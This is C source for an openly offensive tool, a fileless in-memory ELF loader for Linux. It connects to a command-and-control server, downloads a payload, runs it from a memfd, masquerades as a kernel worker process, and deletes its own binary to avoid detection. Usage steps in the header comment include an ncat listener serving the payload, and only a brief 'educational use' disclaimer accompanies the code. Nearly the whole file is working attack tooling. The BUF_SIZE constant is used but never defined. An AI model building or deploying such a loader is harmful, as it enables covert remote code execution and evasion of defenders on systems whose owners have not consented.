/*
 * ---------------------------------------------------------------------------
 *  Fileless In-Memory Loader Linux @4quarks
 * ---------------------------------------------------------------------------
 *  Summary:
 *  This tool implements a fileless, in-memory ELF loader for Linux systems.
 *  It connects to a remote C2 (Command & Control) server over TCP, downloads
 *  a raw ELF payload, and executes it entirely from memory using memfd_create().
 *
 *  Key Features:
 *  - Uses memfd_create() to create a memory-backed, executable file descriptor
 *  - Pulls payload from a configurable C2 IP and port over a socket connection
 *  - Executes the ELF binary directly from memory via /proc/self/fd/<fd>
 *  - Applies a fake process name (argv[0]) for stealth in `ps`, `top`, etc.
 *  - Deletes itself from disk (via unlink("/proc/self/exe")) after execution
 *  - Leaves no payload or loader trace on the filesystem after startup
 *
 *  Typical Use:
 *    1. Compile the loader:
 *         $  gcc -o loader loader.c
 *    2. Start a listener to serve the payload binary:
 *         $ ncat -lvnp 1111 < payload.elf
 *    3. Execute the loader:
 *         $ ./loader
 *
 *  Warning:
 *  This code is for for educational and authorized use only. Do not use on 
 *  systems you do not own or have explicit permission to operate on.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <limits.h>
#include <signal.h>

#ifndef __NR_memfd_create
#define __NR_memfd_create 279
#endif

extern char **environ;

// Parameters
const char *C2_IP        = "127.0.0.1";              // C2 IP
const int   C2_PORT      = 1111;                     // C2 port
const char *FAKE_PROC    = "[kworker/0:1-events]";   // Shown in `ps` output
const char *FD_NAME      = "error";                  // Shown in `cat /proc/<pid>/maps` as `[memfd:error (deleted)]`
const char *PROC_LINK    = "";                       // Detault empty. Shown in `cat /proc/<pid>/status` as `Name: <filename>`.
// SYS_call wrapper for memfd_create
static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}
// Execute payload from memory without exposing /proc path
int exec_memfd(int fd, char **argv, char **envp) {
    return execveat(fd, "", argv, envp, AT_EMPTY_PATH);
}
int main(int argc, char **argv) {
    int sock, fd, n;
    struct sockaddr_in addr;
    char buffer[BUF_SIZE];
    char *exec_argv[] = {(char *)FAKE_PROC, NULL};
    // Build sockaddr
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);
    // Connect to C2
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        exit(EXIT_FAILURE);
    }
    // Create anonymous memory-backed file
    if ((fd = memfd_create(FD_NAME, 0)) < 0) {
        perror("memfd_create");
        close(sock);
        exit(EXIT_FAILURE);
    }
    // Read and write payload into memfd
    while ((n = read(sock, buffer, sizeof(buffer))) > 0) {
        if (write(fd, buffer, n) != n) {
            perror("write");
            close(sock);
            exit(EXIT_FAILURE);
        }
        if (n < BUF_SIZE) break;
    }
    close(sock);
    // Self-delete loader
    char exe_path[PATH_MAX] = {0};  
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len != -1) {
        exe_path[len] = '\0';  
        if (unlink(exe_path) != 0) {
            perror("unlink");
        }
    } else {
        perror("readlink");
    }  
    // Fork and execute from memory
    pid_t pid = fork();
    if (pid == 0) {
        setsid();  // Detach from terminal
        // Prevent zombie for cleaner process
        signal(SIGCHLD, SIG_IGN);
        // If PROC_LINK is defined, create a temporary file to define the process name
        if (PROC_LINK && strlen(PROC_LINK) > 0) {
            // Unlink in case it was already existing
            unlink(PROC_LINK);
            // Create the symbolic link
            char exec_path[64];
            snprintf(exec_path, sizeof(exec_path), "/proc/self/fd/%d", fd);
            if (symlink(exec_path, PROC_LINK) == -1) {
                perror("symlink failed");
                exit(EXIT_FAILURE);
            }
            // Unlink file once it is triggered and loaded in memory
            if (fork() == 0) {
                setsid();
                sleep(5);
                unlink(PROC_LINK);
                _exit(0);
            }
            // Trigger the payload from the temporary symbolic link
            execve(PROC_LINK, exec_argv, environ);
            perror("execve failed");
            exit(EXIT_FAILURE);
        } else {
            // Trigger the payload from memory
            exec_memfd(fd, exec_argv, environ);
            perror("exec_memfd failed");
            exit(EXIT_FAILURE);
        }
    }
    return 0;
}
